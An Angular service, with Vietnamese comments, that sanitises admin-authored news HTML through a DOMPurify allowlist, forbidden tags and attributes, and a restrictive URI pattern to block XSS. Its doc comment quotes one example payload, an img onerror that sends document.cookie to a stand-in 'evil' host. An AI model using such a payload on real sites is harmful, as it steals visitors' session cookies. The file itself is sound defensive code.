import { Injectable } from '@angular/core';
import DOMPurify from 'dompurify';

/**
 * Làm sạch HTML trước khi render — chống XSS.
 *
 * Vì sao cần: `news_items.content` là HTML do ADMIN nhập (đã chốt ở API v0.2 mục
 * 2.9). Render thẳng bằng `[innerHTML]` thì một bài viết chứa
 * `<img src=x onerror="fetch('//evil/'+document.cookie)">` sẽ chạy script trong
 * trình duyệt của MỌI khách đọc bài đó.
 *
 * Vì sao dùng DOMPurify thay vì `DomSanitizer` của Angular: `DomSanitizer` chỉ
 * dùng được trong template với `[innerHTML]`, chặn cả những thứ hợp lệ, và không
 * cho kiểm soát allowlist. DOMPurify là thư viện chuẩn cho việc này — allowlist
 * mặc định đã tính tới hơn 200 vector XSS đã biết, và chạy được trong unit test.
 *
 * Vì sao allowlist HẸP hơn mặc định: bài tin chỉ cần định dạng văn bản và ảnh.
 * Chặn `iframe`, `form`, `input`, `object`, `embed` — chúng không có chỗ trong
 * một bài viết và đều là vector chèn nội dung ngoài.
 */
@Injectable({ providedIn: 'root' })
export class SanitizeService {
  private static readonly ALLOWED_TAGS = [
    'p', 'br', 'strong', 'b', 'em', 'i', 'u', 's',
    'h1', 'h2', 'h3', 'h4',
    'ul', 'ol', 'li',
    'blockquote',
    'a', 'img',
    'table', 'thead', 'tbody', 'tr', 'th', 'td',
    'figure', 'figcaption', 'hr', 'span', 'div',
  ];

  private static readonly ALLOWED_ATTR = [
    'href', 'title', 'target', 'rel', 'src', 'alt', 'width', 'height',
  ];

  private static readonly FORBID_TAGS = [
    'style', 'script', 'iframe', 'form', 'input', 'object', 'embed',
  ];

  private static readonly FORBID_ATTR = ['onerror', 'onload', 'onclick', 'style'];

  sanitizeHtml(html: string): string {
    if (!html) {
      return '';
    }
    return DOMPurify.sanitize(html, {
      ALLOWED_TAGS: SanitizeService.ALLOWED_TAGS,
      ALLOWED_ATTR: SanitizeService.ALLOWED_ATTR,
      // Chặn hẳn giao thức nguy hiểm, kể cả khi lọt qua allowlist thẻ. Không có
      // dòng này thì `href="javascript:..."` và `src="data:text/html,..."` vẫn qua.
      ALLOWED_URI_REGEXP: /^(?:https?|mailto|tel):/i,
      FORBID_TAGS: SanitizeService.FORBID_TAGS,
      FORBID_ATTR: SanitizeService.FORBID_ATTR,
    });
  }
}
